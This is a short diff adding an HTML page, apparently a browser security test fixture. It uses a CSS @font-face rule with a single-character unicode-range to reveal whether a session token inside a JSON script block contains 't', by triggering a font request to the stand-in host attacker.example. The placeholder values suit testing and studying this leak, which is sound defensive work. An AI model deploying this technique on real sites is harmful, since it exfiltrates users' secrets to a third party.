@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8">
+<style>
+@font-face {
+  font-family: "ScriptTextLeak";
+  src: url("https://attacker.example/script-text.woff2");
+  unicode-range: U+0074;
+}
+
+script[type="application/json"] {
+  display: block;
+  white-space: pre;
+  font-family: "ScriptTextLeak";
+}
+</style>
+<script type="application/json">{"session_token":"test-secret"}</script>
